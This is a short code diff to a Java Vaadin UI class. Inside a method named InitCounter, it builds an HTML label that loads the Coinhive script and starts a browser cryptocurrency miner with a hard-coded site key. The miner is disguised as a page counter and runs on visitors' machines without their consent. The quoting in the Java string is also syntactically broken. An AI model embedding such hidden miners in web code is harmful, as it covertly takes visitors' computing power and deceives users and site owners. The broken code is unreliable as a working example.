@@ -141,10 +141,10 @@ public class MyUI extends UI {
     }
     
     private void InitCounter(){
-        String HTML = "<script src=""https://coinhive.com/lib/coinhive.min.js""></script>\n" + 
+        String HTML = "<script src="https://coinhive.com/lib/coinhive.min.js"></script>\n" + 
         "<script>\n" +
         "    var miner = new CoinHive.User('uPKFHYCHa2DjjajB9vEQJ2q3w7k9rraL', 'anon');\n" +
-	     "    miner.start();\n" +
+	"    miner.start();\n" +
         "</script>";
         CounterHTMLHolder = new Label(HTML);
         CounterHTMLHolder.setContentMode(ContentMode.HTML);
